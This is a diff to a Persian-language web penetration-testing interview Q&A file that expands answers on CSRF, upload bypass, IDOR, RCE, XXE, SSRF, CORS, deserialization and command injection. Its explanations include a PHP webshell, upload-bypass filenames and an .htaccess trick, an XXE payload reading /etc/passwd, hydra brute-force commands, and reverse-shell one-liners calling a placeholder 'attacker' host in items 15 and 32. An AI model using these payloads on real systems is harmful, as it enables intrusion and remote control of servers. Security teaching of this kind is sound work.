@@ -234,125 +234,578 @@ sqlmap -u "http://site.com/vuln.php?id=1" --tamper=*
 
 ---  
 
-### 8. حمله CSRF چیست؟ چگونه کشف می کنید؟ چگونه می توان از آن جلوگیری کرد؟
- 
-یک حمله که هکر برازر browser یوزر را مجاب می کند یک عملیات ناخواسته را انجام دهد مثل تعویض پسورد.برای تست باید یک اسکریپت برای یک عملیات نوشت و تست کرد.
-جهت جلوگیری از چندین روش میشه استفاده کرد:
-استفاده از 
-```
-csrf token
 
-Same site cookies
-
-Check referer header
-```
-و ...
-
----
-
-### 9. چند روش برای بایپس آپلودر بلد هستید؟ هر کدام را شرح دهید.
-
-```
-File extension change
-Shell.php1
-Mime type change
-image/jpeg
-Case sensitive change
-shell.Php1
-Htaccess
-AddType application/x-httpd-php .shell
-```
----
-### 10. مشکل misconfiguration در وب چیست؟ چگونه کشف می کنید؟
-
-وقتی پسورد دیفالت یا ضعیف داشته باشه برنامه آپدیت شده نباشند یا بشه بنر گربینگ کرد سرویس ها اینا همه misconfiguration security issues محسوب می شوند.
-برای چک کردن این موارد به صورت دستی و ابزارهای اتومات میشه چک کرد. Nmap hydra burp suite و...
-
----
-
-### 11. حمله Clickjacking چیست؟ نحوه جلوگیری کردن آن را در صورتی که می دانید شرح دهید.
-
-یک حمله می باشد که هکر یک یک المنت روی صفحه قرار دارد برای فریب که در صورت که کلیک کرد عملی بدون authentication authorization انجام شود
-
-برای جلوگیری از این حمله می توان از csp یا x-frame option header استفاده می کنند.
-
----
-### 12. چگونه مکانیسم های User Authentication و Session Management را تست می کنید؟
-
-برای تست user authentication تمامی متدهای احراز هویت مختلف تست می کنم تا چک کنم ببینم بدون احراز هویت امکان دسترسی وجود دارد یا نه.
-
-برای چک کردن session management از توکن های تولید شده استفاده می کنم و چک می کنم ببینم expire می شند یا نه اگر expire بشند قابل استفاده هستند یا نه
-
----
-### 13. در فرآیند تست نفوذ وب از چه ابزارهایی در چه مرحله ای استفاده می کنید؟
-
-ابزارهای Burp suite, sqlmap, Nikto. Acunetix, Netsparker
-
----
-### 14. آسیب پذیری IDOR چیست؟ چگونه آن را کشف و اکسپلویت می کنید؟
-
-آسیب پذیری که موجب افشا شدن اطلاعات یا دسترسی بدون اجازه به اطلاعات را می دهد.
-
-یکی از روش ها برای چک تو تنظیمات پروفایل، صفحه سفارش می گردم و بعد شروع به تغییر id می کنم تا ببینم توانایی دسترسی به پروفایل ها یا اطلاعات دیگران را دارم یا نه که اگر بتونم ادمین بشم privilege escalation رخ داده است.
-
----  
-
-### 15. آسیب پذیری RCE چیست؟ چه زمانی رخ می دهد؟ چگونه آن را کشف می کنید؟ به چه نحو اکسپلویت میکنید؟
-
-آسیب پذیری که اجازه تزریق کد را به سرور می دهد و کدها مستقیم روی سرور اجرا میشود وقتی که ورودی چک نشود و همان ورودی مستقیم روی سرور اجرا شود. معمولا input ها را چک میکنم ولی بیشتر جاهای که اپلودر دارد شل اپلود را چک میکنم.
-
- --- 
-
-### 16. مشکل امنیتی Sensitive Data Exposure چیست ؟ با چه تست هایی چک می کنید؟
-
-وقتی اطلاعات از قبیل پسورد اطلاعات شخصی کاربران مثل عکس پاسپورت بدون احراز هویت و تعیین سطح دسترسی در دسترس هست.
-
-برای تست code review میکنم، فایل های روی سرور را فاز میکنم، API چک میکنم، به دنبال elastic میگردم اگر بدون پسورد یا دیفالت پسورد بود بتونم دسترسی به دیتا پیدا کنم.
-
----
-
-### 17. عبارت Input Validation توضیح دهید؟ چگونه دور می زنید؟
-
-معمولا به دو شکل سمت کلاینت و سرور
-
-برای کلاینت از سمت browser می توان راحت دور زد
-
-سمت سرور ممکن است waf جلوگیری کند یا یک سری قوانین برای جلوگیری از تزریق sql باشد که با تغییرات در درخواست سعی به دور زدن میکنم.
-
----  
-
-### 18. حمله XXE چیست؟ چگونه می توان جلوگیری کرد؟
-
-حمله Xml external entity نوعی از حمله می باشد به علت آسیب پذیری پارسر xml می باشد که توسط آن می توان به اطلاعات دسترسی داشت یا درخواست بدون دسترسی را انجام داد.
-
-تکنیک های Input validation, white list, update xml parser جزوری از روش های جلوگیری می باشد.
-
----  
-
-### 19. نحوه تست روی Restful API ها را شرح دهید.
-
-برای تست API موارد احراز هویت، input validation، output encoding تا ببینم error handling دارد یا اطلاعات سرور را می دهد همچنین کلیه حملات sqli xss csrf را چک می کنم.
-
-### 20. حمله SSRF چیست؟ چگونه می توان جلوی آن را گرفت؟
-
-حمله Server side request forgery یک حمله هست که به هکر اجازه می دهد به یک سرور داخلی یا یک سرور خارجی دیگر درخواست ایجاد کند.
-برای جلوگیری از آن روش های input validation whitelisting و محدود کردن درخواست بین سرورها را انجام می دهم.
-
----  
+<details markdown="1"> <summary><h3>  8. حمله CSRF چیست؟ چگونه کشف می کنید؟ چگونه می توان از آن جلوگیری کرد؟ </h3></summary>
   
-### 21. آسیب پذیری های متداول Business Logic را شرح دهید. چطور تست می گیرید؟
+**حمله CSRF** (Cross-Site Request Forgery) نوعی تهدید است که **browser کاربر** را فریب می‌دهد تا **درخواست ناخواسته** (مانند تغییر پسورد، انتقال وجه یا حذف حساب) را **بدون آگاهی** او به سرور ارسال کند. این حمله زمانی موفق می‌شود که کاربر قبلاً **احراز هویت** شده باشد و سرور نتواند تشخیص دهد درخواست از منبع معتبر آمده یا خیر.
 
-قبل از شروع به کار در مورد بیزینس که قرار تست کنم مطالعه می کنم نحوه کار کرد گردش کار و پراسس های مختلف در هر مرحله بعد شروع به نوشتم سناریو برای دور زدن هر بخش و رد شدن می کنم با توجه به هر بزینس سناریوها نفوذ متفاوت می باشد.
+### **روش‌های کشف:**
+- درخواست‌های حساس (مانند POST/GET در فرم‌ها) را **بدون CSRF token** تکرار کنید.
+- بررسی کنید آیا سرور **Referer** یا **Origin header** را اعتبارسنجی می‌کند یا خیر.
+- تست با **تغییر method** (مثلاً POST به GET) یا **حذف cookieهای session**.
+
+### **راه‌های جلوگیری:**
+- **CSRF Token**: توکن تصادفی و منحصر به هر session که در هر فرم/درخواست قرار گیرد.
+- **SameSite Cookies**: تنظیم کوکی‌ها به `Lax` یا `Strict` برای محدود کردن ارسال در درخواست‌های cross-site.
+- **اعتبارسنجی Referer/Origin**: اطمینان از مطابقت دامنه درخواست با دامنه اصلی.
+- **استفاده از Custom Header**: افزودن هدر دلخواه (مانند `X-CSRF-Token`) که فقط از طریق JavaScript داخلی قابل ارسال باشد.
+
+> **نکته کلیدی:** CSRF در برابر کاربران **احراز هویت‌شده** خطرناک است و با ترکیب XSS قابل تشدید است.
+</details>
 
 ---
-### 22. برای گزارش نویسی چه مواردی را در نظر می گیرید؟
 
-گزارش چند بخشی می کنم مدیریت، فنی تحلیل آسیب پذیری و سعی می کنم خیلی واضع و ساده در بخش مدیریت تمام ریسک ها را توضیح بدهم و از آوردن اصطلاحات فنی خودداری میکنم ولی در بخش فنی به صورت کامل با جزییات از روش هایی که برای تست استفاده کردم و نتایجی که بدست آوردم poc آسیب پذیری را قرار می دهم همچنین برای تمامی آسیب پذیری هایی که کشف کردم روش های mitigation و prevention را برای تیم فنی قرار می دهم.
+
+<details markdown="1"> <summary><h3>   9. چند روش برای بایپس آپلودر بلد هستید؟ هر کدام را شرح دهید. </h3></summary>
+
+**آپلودرهای وب** معمولاً با بررسی **پسوند فایل**، **MIME type** یا **محتوای فایل**، از آپلود شل جلوگیری می‌کنند. در ادامه، روش‌های رایج **بایپس** این محدودیت‌ها آورده شده است:
+
+| روش | توضیح | مثال |
+|-----|-------|------|
+| **تغییر پسوند (Extension Manipulation)** | استفاده از پسوندهای دوگانه یا مجاز | `shell.php.jpg` یا `shell.php.png` |
+| **Null Byte Injection** | استفاده از `%00` برای قطع رشته در زبان‌های قدیمی (PHP < 5.3.4) | `shell.php%00.jpg` |
+| **تغییر MIME Type** | تغییر هدر `Content-Type` در درخواست به نوع مجاز | `image/jpeg` یا `image/png` (با Burp) |
+| **حساسیت به حروف بزرگ/کوچک (Case Sensitivity)** | بهره‌برداری از عدم یکسان‌سازی حروف در سرور | `shell.PhP` یا `shell.pHp` |
+| **آپلود .htaccess** | آپلود فایل تنظیمات برای تغییر رفتار سرور | محتوای فایل: `AddType application/x-httpd-php .jpg` |
+
+**نکته اجرایی:** تمام روش‌ها را با **تغییر درخواست در Burp Suite** (در تب Repeater یا Intruder) تست کنید. پس از آپلود، فایل را در مسیرهای مختلف (مانند `/uploads/`) جستجو کنید.
+
+> **پیشنهاد:** همیشه با **فایل‌های تست ساده** (مثل `<?php echo "test"; ?>`) شروع کنید و از **اسکنرهای خودکار** مانند **Nikto** یا **Dirb** برای یافتن مسیر آپلود استفاده کنید.
+</details>
 
 ---
-  
-<div align=center markdown="1">
 
+
+<details markdown="1"> <summary><h3>  10. مشکل misconfiguration در وب چیست؟ چگونه کشف می کنید؟  </h3></summary> 
+
+**Security Misconfiguration** (OWASP A05):
+زمانی رخ می‌دهد که **تنظیمات امنیتی سیستم** به درستی پیکربندی نشده باشند و نقاط ضعفی مانند دسترسی غیرمجاز، افشای اطلاعات یا بهره‌برداری آسان ایجاد کنند.
+
+### **نمونه‌های رایج:**
+- استفاده از **default credentials** (مانند `admin/admin` یا `root/toor`)
+- **software outdated** با آسیب‌پذیری شناخته‌شده (مثل Apache 2.2.x)
+- **exposed directories** (مانند `/admin/`، `.git/`، `backup/`)
+- **directory listing** فعال
+- **debug mode** یا **error messages** با اطلاعات حساس
+
+---
+
+### **روش‌های کشف:**
+
+| روش | ابزار | مثال |
+|-----|-------|------|
+| **بررسی دستی** | مرورگر / curl | چک `robots.txt`، `sitemap.xml`، `.env`، `.git/HEAD` |
+| **اسکن خودکار** | **Nikto** | `nikto -h https://site.com` |
+| **Banner Grabbing** | **Nmap** | `nmap -sV --script=banner site.com` |
+| **Brute-force Credentials** | **Hydra** / **Medusa** | `hydra -l admin -P wordlist.txt site.com http-post-form` |
+| **Directory Enumeration** | **Gobuster** / **Dirb** | `gobuster dir -u https://site.com -w common.txt` |
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 11. حمله Clickjacking چیست؟ نحوه جلوگیری از آن را شرح دهید. </h3></summary>
+
+**حمله Clickjacking** نوعی تهدید است که با استفاده از **iframe پنهان** (با opacity صفر یا موقعیت خارج از دید)، کاربر را فریب می‌دهد تا روی **عنصر مخرب** (مانند دکمه لایک، انتقال وجه یا تأیید حذف) کلیک کند، بدون اینکه متوجه شود.
+
+### **مکانیزم حمله:**
+- مهاجم یک صفحه مخرب می‌سازد و iframe را روی سایت هدف قرار می‌دهد.
+- کاربر فکر می‌کند روی دکمه‌ای در صفحه مخرب کلیک می‌کند، اما در واقع روی عنصر سایت اصلی کلیک کرده است.
+- این حمله در برابر کاربران **احراز هویت‌شده** مؤثر است.
+
+### **روش‌های جلوگیری:**
+| روش | توضیح |
+|-----|-------|
+| **X-Frame-Options** | هدر HTTP که مرورگر را از قرار دادن صفحه در iframe منع می‌کند. مقادیر: `DENY` (کاملاً ممنوع)، `SAMEORIGIN` (فقط در همان دامنه) |
+| **CSP frame-ancestors** | سیاست امنیتی محتوا که مشخص می‌کند چه دامنه‌هایی اجازه فریم کردن صفحه را دارند. مثال: `frame-ancestors 'self'` |
+| **JavaScript Frame-Busting** | اسکریپت جاوااسکریپت برای جلوگیری از فریم شدن (کمتر توصیه می‌شود، قابل دور زدن است) |
+
+> **نکته کلیدی:** ترکیب `X-Frame-Options` و `CSP` بهترین دفاع را ایجاد می‌کند. این حمله با **XSS** قابل تشدید است.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 12. چگونه مکانیسم‌های User Authentication و Session Management را تست می‌کنید؟ </h3></summary>
+
+**احراز هویت** و **مدیریت session** دو ستون اصلی امنیت وب هستند. تست آن‌ها شامل بررسی نقاط ضعف در **ورود، نگهداری و خروج کاربر** است.
+
+### **تست احراز هویت (Authentication):**
+| تست | ابزار | هدف |
+|-----|-------|-----|
+| **Brute-force Attack** | Hydra, Burp Intruder | بررسی عدم وجود rate limiting |
+| **Weak Password Policy** | دستی | تست پسوردهای ساده مثل `123456` |
+| **Credential Stuffing** | لیست نشت‌شده | استفاده از ایمیل/پسوردهای واقعی |
+| **Password Reset Poisoning** | Burp | دستکاری host header در ایمیل ریست |
+
+### **تست مدیریت session (Session Management):**
+| تست | ابزار | هدف |
+|-----|-------|-----|
+| **Session Fixation** | دستی | استفاده از session ID قبل از لاگین |
+| **Session Hijacking** | Wireshark, Burp | بررسی عدم استفاده از HTTPS |
+| **Cookie Attributes** | Burp | چک `Secure`, `HttpOnly`, `SameSite` |
+| **Session Timeout** | Burp Repeater | بررسی انقضا پس از بی‌فعالی |
+| **Concurrent Logins** | چند تب | تست اجازه ورود همزمان |
+
+> **ابزارهای پیشنهادی:** Burp Suite (Sequencer برای entropy)، Hydra، OWASP ZAP  
+> **نکته:** همیشه با **logout کامل** و **تخلیه کوکی‌ها** تست کنید.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 13. در فرآیند تست نفوذ وب از چه ابزارهایی در چه مرحله‌ای استفاده می‌کنید؟ </h3></summary>
+
+فرآیند تست نفوذ وب بر اساس **مدل PTES** (Penetration Testing Execution Standard) شامل ۷ مرحله است. در هر مرحله، ابزارهای تخصصی استفاده می‌شود:
+
+| مرحله | ابزارهای کلیدی | کاربرد |
+|-------|----------------|--------|
+| **Reconnaissance** | Nmap, Sublist3r, Amass, Shodan | جمع‌آوری اطلاعات (subdomain, IP, tech stack) |
+| **Scanning** | Nikto, OpenVAS, Nessus, Gobuster | اسکن آسیب‌پذیری و directory enumeration |
+| **Vulnerability Assessment** | Burp Suite, OWASP ZAP, Nuclei | تست دستی و خودکار وب |
+| **Exploitation** | SQLMap, Metasploit, Custom Scripts | بهره‌برداری از آسیب‌پذیری‌ها |
+| **Post-Exploitation** | Meterpreter, PowerShell Empire | حفظ دسترسی، privilege escalation |
+| **Reporting** | Dradis, KeepNote, Markdown | مستندسازی یافته‌ها و PoC |
+
+> **نکته عملی:** همیشه از **Burp Suite** به عنوان ابزار مرکزی (proxy + scanner + repeater) استفاده کنید.  
+> **پیشنهاد:** یک **pipeline خودکار** با Nuclei + SQLMap + Gobuster بسازید.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 14. آسیب‌پذیری IDOR چیست؟ چگونه آن را کشف و اکسپلویت می‌کنید؟ </h3></summary>
+
+**IDOR** (Insecure Direct Object Reference):
++ نوعی نقص در **کنترل دسترسی** است که اجازه می‌دهد کاربر به **منابع دیگران** (مانند پروفایل، سفارش، فایل) با تغییر **شناسه** دسترسی پیدا کند.
+
+### **انواع IDOR:**
+- **Horizontal**: دسترسی به داده‌های کاربر هم‌سطح (مثل پروفایل کاربر دیگر)
+- **Vertical**: دسترسی به داده‌های سطح بالاتر (مثل ادمین)
+
+### **روش‌های کشف:**
+| روش | مثال |
+|-----|------|
+| **تغییر پارامتر** | `user_id=123` → `user_id=124` |
+| **تغییر JSON** | `"order_id": 100` → `"order_id": 101` |
+| **تغییر مسیر** | `files/123.pdf` → `/files/124.pdf/` |
+| **استفاده از UUID** | تغییر بخش آخر UUID |
+
+### **اکسپلویت:**
+- با **Burp Intruder**، لیست IDها را fuzz کنید.
+- از **wordlist** شامل اعداد ترتیبی، UUID، یا خروجی reconnaissance استفاده کنید.
+- اگر دسترسی به ادمین گرفتید → **Privilege Escalation**.
+
+> **ابزار:** Burp Suite, ffuf, Arjun (برای پیدا کردن پارامترهای مخفی)  
+> **پیشنهاد:** همیشه **نقش‌های مختلف** (کاربر عادی، ادمین، مهمان) را تست کنید.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 15. آسیب‌پذیری RCE چیست؟ چه زمانی رخ می‌دهد؟ چگونه آن را کشف و اکسپلویت می‌کنید؟ </h3></summary>
+
+**RCE** (Remote Code Execution):
++ جدی‌ترین نوع آسیب‌پذیری است که اجازه **اجرای کد دلخواه** روی سرور را به مهاجم می‌دهد.
+
+### **شرایط وقوع:**
+- ورودی کاربر **sanitized نشود** و مستقیماً به `()system()`, `eval` یا `()exec` برود.
+- آپلود فایل بدون **فیلتر محتوا**.
+- استفاده از **deserialization ناامن**.
+
+### **روش‌های کشف:**
+| نوع | مثال |
+|-----|------|
+| **Command Injection** | `; id` یا `| whoami` در input |
+| **File Upload** | آپلود `shell.php` با bypass |
+| **Log Poisoning** | تزریق کد در لاگ و سپس include |
+| **Deserialization** | payload ysoserial در object |
+
+### **اکسپلویت:**
+- با **reverse shell** (مثل `bash -i >& /dev/tcp/attacker/4444 0>&1`)
+- استفاده از **Metasploit** یا **Netcat**
+- آپلود **webshell** (مثل `<?php system($_GET['cmd']); ?>`)
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 16. مشکل امنیتی Sensitive Data Exposure چیست؟ با چه تست‌هایی چک می‌کنید؟ </h3></summary>
+
+**Sensitive Data Exposure** (OWASP A02):
++ زمانی است که **داده‌های حساس** (پسورد، کارت اعتباری، اطلاعات شخصی) **بدون حفاظت کافی** ذخیره یا منتقل شوند.
+
+### **نمونه‌های رایج:**
+- انتقال داده در **HTTP** (نه HTTPS)
+- ذخیره **پسورد به صورت plain text**
+- افشای **API keys** در کد یا response
+- **Backup files** با داده حساس
+
+### **تست‌های پیشنهادی:**
+| تست | ابزار |
+|-----|-------|
+| **چک HTTPS** | SSL Labs, testssl.sh |
+| **جستجوی داده در response** | Burp Suite (Search) |
+| **فایل‌های پشتیبان** | Gobuster با wordlist backup |
+| **کد منبع** | GitHub dorks, .git exposure |
+| **API endpoints** | Postman, Burp |
+
+> **پیشنهاد:** همیشه **response headers** را برای `Server`, `X-Powered-By` چک کنید.  
+> **ابزار اضافی:** Shodan, HaveIBeenPwned
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 17. عبارت Input Validation توضیح دهید؟ چگونه دور می‌زنید؟ </h3></summary>
+
+**Input Validation**:
++ فرآیندی است که **ورودی کاربر** را قبل از پردازش، از نظر **نوع، طول، فرمت و محتوای مجاز** بررسی می‌کند.
+
+### **انواع اعتبارسنجی:**
+- **Client-side**: با JavaScript (قابل دور زدن)
+- **Server-side**: با کد سرور (حتمی)
+
+### **روش‌های دور زدن:**
+| روش | توضیح |
+|-----|-------|
+| **تغییر درخواست** | حذف یا تغییر فیلد در Burp |
+| **Encoding** | URL encode, Double encode |
+| **WAF Bypass** | استفاده از comments, case variation |
+| **Parameter Pollution** | تکرار پارامتر (`id=1&id=2`) |
+
+> **نکته:** همیشه **هر دو سمت** را تست کنید.  
+> **ابزار:** Burp Repeater, Encoder
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 18. حمله XXE چیست؟ چگونه می‌توان جلوگیری کرد؟ </h3></summary>
+
+**XXE** (XML External Entity):
++ حمله‌ای است که با سوءاستفاده از **parser XML**، اجازه **خواندن فایل‌ها**، **درخواست‌های داخلی** یا **DoS** را می‌دهد.
+
+### **مثال payload:**
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<user>&xxe;</user>
+```
+
+### **روش‌های جلوگیری:**
+- **غیرفعال کردن external entities** در parser
+- **استفاده از JSON** به جای XML
+- **Whitelist مجاز برای DTD**
+- **به‌روزرسانی parser**
+
+> **ابزار تست:** Burp Collaborator, XXE payloads  
+> **نکته:** در APIهای SOAP و SVG رایج است.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 19. نحوه تست روی Restful APIها را شرح دهید. </h3></summary>
+
+تست **API** شامل بررسی **احراز هویت، دسترسی، ورودی و خروجی** است.
+
+### **مراحل تست:**
+1. **کشف endpointها**: با Swagger, Postman, Burp Spider
+2. **تست احراز هویت**: JWT, OAuth, API Key
+3. **تست دسترسی**: IDOR, Over-privileged roles
+4. **تست ورودی**: Injection, Mass Assignment
+5. **تست خروجی**: Information Disclosure, Error Handling
+
+### **ابزارها:**
+| ابزار | کاربرد |
+|-------|--------|
+| **Postman** | تست دستی |
+| **Burp Suite** | proxy و fuzzing |
+| **OWASP ZAP** | اسکن خودکار |
+| **Kiterunner** | brute-force API paths |
+
+> **پیشنهاد:** از **OWASP API Security Top 10** استفاده کنید.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 20. حمله SSRF چیست؟ چگونه می‌توان جلوی آن را گرفت؟ </h3></summary>
+
+**SSRF** (Server-Side Request Forgery)
++ حمله‌ای است که سرور را وادار می‌کند **درخواست به منابع داخلی یا خارجی** بفرستد.
+
+### **اهداف رایج:**
+- دسترسی به `http://169.254.169.254` (metadata AWS)
+- اسکن شبکه داخلی
+- خواندن فایل‌های محلی
+
+### **جلوگیری:**
+- **Whitelist مجاز برای URL**
+- **مسدود کردن پروتکل‌های غیرضروری** (file://, gopher://)
+- **اعتبارسنجی ورودی**
+- **شبکه‌سازی مناسب** (firewall)
+
+> **ابزار:** Burp Collaborator برای blind SSRF
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 21. آسیب‌پذیری‌های متداول Business Logic را شرح دهید. چطور تست می‌گیرید؟ </h3></summary>
+
+**Business Logic Flaws**:
++ نقص‌هایی در **گردش کار کسب‌وکار** هستند که با دور زدن مراحل، بهره‌برداری می‌شوند.
+
+### **نمونه‌ها:**
+- خرید با قیمت منفی
+- ثبت‌نام چندباره برای تخفیف
+- تغییر مقدار سفارش پس از پرداخت
+
+### **روش تست:**
+1. **نقشه‌برداری جریان** (UML, Sequence Diagram)
+2. **سناریوسازی** برای هر مرحله
+3. **تست با چند حساب همزمان**
+4. **استفاده از Burp Macro**
+
+> **نکته:** نیاز به **درک عمیق کسب‌وکار** دارد.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 22. برای گزارش‌نویسی چه مواردی را در نظر می‌گیرید؟ </h3></summary>
+
+گزارش حرفه‌ای شامل **سه بخش اصلی** است:
+
+### **۱. خلاصه مدیریتی (Executive Summary):**
+- سطح ریسک کلی
+- تعداد آسیب‌پذیری‌های Critical/High
+- تأثیر بر کسب‌وکار
+
+### **۲. جزئیات فنی (Technical Findings):**
+| بخش | محتوا |
+|-----|-------|
+| **عنوان** | نام آسیب‌پذیری + CVSS |
+| **توضیح** | چگونگی وقوع |
+| **PoC** | اسکرین‌شات، کد، ویدیو |
+| **تأثیر** | دسترسی، افشا، RCE |
+| **پیشنهاد رفع** | کد، تنظیمات، پچ |
+
+### **۳. پیوست‌ها:**
+- ابزارها، scope، timeline
+
+> **ابزار:** Dradis, Serif, Markdown + Screenshots  
+> **استاندارد:** CVSS v3.1, OWASP
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 23. شناسایی (Reconnaissance) در تست نفوذ وب چیست؟ ابزارها کدامند؟ </h3></summary>
+
+**Reconnaissance**
++ اولین و مهم‌ترین مرحله است که **جمع‌آوری اطلاعات** از هدف را شامل می‌شود.در این مرحله ما با استفاده از تکنیک های ریکان سعی میکنیم دارایی های مربوط به سازمان رو شناسایی کنیم تا بتونیم با استفاده از خروجی این مرحله تحلیل انجام بدیم و متودلوژی بررسی اسیب پذیری هارو طبق ساختاری که از هدف شناسایی کردیم بسازیم.
+
+### **انواع:**
+- **Passive**: بدون تماس مستقیم (Shodan, Google Dorks, Provider discovery)
+- **Active**: با تماس (DNS-Brute, Nmap, DNS lookup, Fuzzing)
+
+### **ابزارهای کلیدی:**
+| ابزار | کاربرد |
+|-------|--------|
+| **Dns-Brute** | subdomain enumeration |
+| **Amass** | OSINT پیشرفته |
+| **Nmap** | port scanning |
+| **Shodan** | دستگاه‌های متصل به اینترنت |
+| **theHarvester** | ایمیل، hostname |
+
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 24. ضعف‌های Cryptographic (OWASP A02) چیست؟ چطور تست می‌کنید؟ </h3></summary>
+
+**Cryptographic Failures**:
++ این تاپیک شامل استفاده نادرست از رمزنگاری است.
+
+### **نمونه‌ها:**
+- هش با MD5/SHA1
+- کلیدهای سخت‌کد شده
+- عدم استفاده از TLS
+
+### **تست‌ها:**
+| تست | ابزار |
+|-----|-------|
+| **SSL/TLS** | SSL Labs, testssl.sh |
+| **هش پسورد** | CrackStation, Hashcat |
+| **کلیدها در کد** | Gitrob, TruffleHog |
+| **HSTS** | Burp, curl |
+
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 25. آسیب‌پذیری Vulnerable and Outdated Components (OWASP A06) چیست؟ چگونه کشف می‌کنید؟ </h3></summary>
+
+استفاده از **کتابخانه‌های قدیمی** با CVE شناخته‌شده.
+
+### **روش کشف:**
+- **Wappalyzer**: تشخیص فناوری
+- **Retire.js**: اسکن JS
+- **OWASP Dependency-Check**: برای Java/.NET
+- **NPM Audit**: برای Node.js
+
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 26. Misconfiguration CORS چیست؟ چگونه بایپس می‌کنید؟ </h3></summary>
+
+**CORS** (Cross-Origin Resource Sharing):
++ تنظیماتی است که مشخص می‌کند چه دامنه‌هایی اجازه دسترسی به منابع را دارند. اگر به درستی کانفیگ نشود میتواند با اسیب پذیریی های دیگه مرج شود و منجر به حملات پیشرفته شود.
+
+### **تنظیمات خطرناک:**
+- `Access-Control-Allow-Origin: *`
+- `Access-Control-Allow-Credentials: true` با `*`
+
+### **تست:**
+```http
+Origin: http://evil.com
+```
+اگر پاسخ شامل `Access-Control-Allow-Origin: http://evil.com` باشد → آسیب‌پذیر.
+
+> **جلوگیری:** فقط دامنه‌های مجاز را whitelist کنید.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 27. هدرهای امنیتی HTTP چیست؟ اهمیت آن‌ها چقدر است؟ </h3></summary>
+
+هدرهای HTTP که امنیت مرورگر را افزایش می‌دهند:
+
+| هدر | عملکرد |
+|-----|--------|
+| **HSTS** | اجبار HTTPS |
+| **X-Content-Type-Options** | جلوگیری از MIME sniffing |
+| **X-Frame-Options** | جلوگیری از Clickjacking |
+| **CSP** | کنترل منابع قابل بارگذاری |
+| **Referrer-Policy** | کنترل اطلاعات ارجاع |
+
+> **تست:** [securityheaders.com](https://securityheaders.com)
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 28. Rate Limiting و Brute Force Protection چطور تست می‌کنید؟ </h3></summary>
+
+**Rate Limiting**:
++ محدودیت تعداد درخواست در بازه زمانی است. ریتلیمت بسیار مهم است و در صورت نداشتن کانفیگ و تنظیمات درست این اسیب پذیری میتواند بسیار جدی باشد و سازمان هارا بصورت جدی تهدید کند. نبود محدودیت در درخواست در بازه زمانی مشخص میتواند زمینه ایجاد و اجرای اکسپلویت هارا هم فراهم کند.
+
+### **تست:**
+- با **Burp Turbo Intruder** یا **Hydra**، ۱۰۰ درخواست در ۱ ثانیه ارسال کنید.
+- بررسی **lockout** پس از N تلاش ناموفق.
+- تست **CAPTCHA** و **2FA**.
+
+> **پیشنهاد:** حداقل ۵ تلاش قبل از lockout و ۳۰ ثانیه تأخیر.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 29. Logging and Monitoring Failures (OWASP A09) چیست؟ </h3></summary>
+
+عدم **ثبت** یا **نظارت** بر رویدادهای امنیتی.
+
+### **تست:**
+- تزریق payload و بررسی **عدم وجود log**
+- تلاش لاگین ناموفق → آیا هشدار ارسال می‌شود؟
+- بررسی **SIEM** یا **ELK Stack**
+
+> **پیشنهاد:** لاگ‌های لاگین، خطا و دسترسی را فعال کنید.
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 30. حمله Web Cache Poisoning چیست؟ چگونه کشف و جلوگیری می‌شود؟ </h3></summary>
+
+**Cache Poisoning**:
++ تزریق پاسخ مخرب در کش سرور است.
+
+### **کشف:**
+- استفاده از هدرهای **unkeyed** (مثل `X-Forwarded-Host`)
+- تزریق XSS در پاسخ کش‌شده
+
+### **جلوگیری:**
+- **Vary: User-Agent, Origin**
+- **Cache Key** شامل تمام هدرهای مهم
+- **Cache Invalidation**
+
+> **ابزار:** Burp Suite, Param Miner
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 31. آسیب‌پذیری Deserialization چیست؟ چگونه کشف و اکسپلویت می‌کنید؟ </h3></summary>
+
+**Deserialization**:
++ تبدیل داده سریال‌شده (JSON, XML, Pickle) به object است.
+
+### **خطر:**
+- اجرای کد مخرب هنگام deserialize
+
+### **کشف:**
+- جستجوی `O:` یا `java.util` در درخواست
+- تست با **ysoserial**
+
+### **اکسپلویت:**
+- ساخت payload با **ysoserial**
+- ارسال در cookie یا parameter
+
+> **جلوگیری:** عدم deserialize داده‌های کاربر، استفاده از JSON
+
+</details>
+
+---
+
+<details markdown="1"> <summary><h3> 32. حمله Command Injection چیست؟ چه زمانی رخ می‌دهد؟ چگونه کشف و اکسپلویت می‌کنید؟ </h3></summary>
+
+**Command Injection**:
++ تزریق دستورات سیستم‌عامل در ورودی است.
+
+### **شرایط:**
+- استفاده از `system()`, `exec()` بدون sanitize
+
+### **کشف:**
+- ورودی با `; id`, `| whoami`, `&& ls`
+
+### **اکسپلویت:**
+- reverse shell:
+  ```bash
+  ; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker 4444 > /tmp/f
+  ```
+
+> **جلوگیری:** whitelist دستورات، escape کاراکترها
+
+</details>
+
+
+
+
+
+
+
+
+
+
+---
 # سوالات سطح حرفه ای
 
 </div>
